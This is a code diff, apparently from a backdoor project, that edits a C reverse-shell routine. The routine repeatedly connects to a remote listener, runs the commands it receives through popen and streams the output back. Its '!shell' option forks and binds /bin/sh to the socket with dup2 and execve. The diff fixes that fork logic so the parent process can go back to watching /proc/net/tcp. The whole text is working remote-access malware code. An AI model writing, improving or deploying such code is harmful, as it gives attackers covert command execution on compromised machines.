@@ -22,7 +22,6 @@ void reverse_shell(const char *host, unsigned int port, unsigned int num_shells)
     client.sin_port = htons(port);
 
     while (1) {
-
         sock = socket(AF_INET, SOCK_STREAM, 0);
         // Try connecting every few seconds.
         // Our listener might not always be available
@@ -48,8 +47,11 @@ void reverse_shell(const char *host, unsigned int port, unsigned int num_shells)
         while (read(sock, input, sizeof(input) - sizeof(cmd_postfix) - 1) > 0) {
             // "!shell" drops you into a more "usable" shell
             if (strncmp("!shell", input, strlen("!shell")) == 0) {
-                // Call does not return
+                // Call will create a new process that uses `sock` as a reverse shell.
                 reverse_shell_classic(sock);
+                // Our parent process needs to break out of this while loop to free up `sock`.
+                // This will cause the parent process to begin monitoring /proc/net/tcp again
+                break;
             } else {
                 // Add a postfix to the command to redirect stderr to stdout, s.t.
                 // it is also picked up by fgets
@@ -57,7 +59,7 @@ void reverse_shell(const char *host, unsigned int port, unsigned int num_shells)
                 strcpy(enter, cmd_postfix);
                 FILE *fp = popen(input, "r");
                 while (fgets(output, sizeof(output), fp) != NULL) {
-                    send(sock, output, strlen(output)+1, 0);
+                    send(sock, output, strlen(output) + 1, 0);
                 }
                 pclose(fp);
             }
@@ -67,11 +69,14 @@ void reverse_shell(const char *host, unsigned int port, unsigned int num_shells)
 }
 
 void reverse_shell_classic(int sock) {
-    dup2(sock, 0);
-    dup2(sock, 1);
-    dup2(sock, 2);
-    char * args[] = {"/bin/sh", NULL};
-    execve(args[0], args, 0);
+    int pid = fork();
+    if (pid != 0) {
+        dup2(sock, 0);
+        dup2(sock, 1);
+        dup2(sock, 2);
+        char *args[] = {"/bin/sh", NULL};
+        execve(args[0], args, 0);
+    }
 }
 
 // Read the current number of reverse shells we've got going at the moment.
